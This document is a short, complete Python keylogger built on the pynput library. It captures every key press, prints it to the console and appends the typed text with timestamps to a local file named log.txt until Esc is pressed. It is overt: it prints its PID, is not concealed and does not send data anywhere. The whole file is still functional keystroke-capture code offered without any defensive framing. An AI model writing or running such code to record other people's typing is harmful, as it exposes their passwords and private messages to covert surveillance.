import pynput 
import datetime
from pynput.keyboard import Key, Listener # Listener listen to key events
import os
import sys

print(sys.argv[0][:-3])
pid = str(os.getpid())
print("Current process PID: " + pid)

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))                               

    # after 5 keys pressed updates de file
    if count >= 5:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):     
    space_count = 0
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0 and space_count < 1  :
                f.write('\n')
                f.write('\n'+datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")+': ')
                space_count += 1
            
            elif k.find("Key") == -1:
                f.write(k)
                space_count = 0
            

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press = on_press, on_release = on_release) as listener: 
    listener.join()

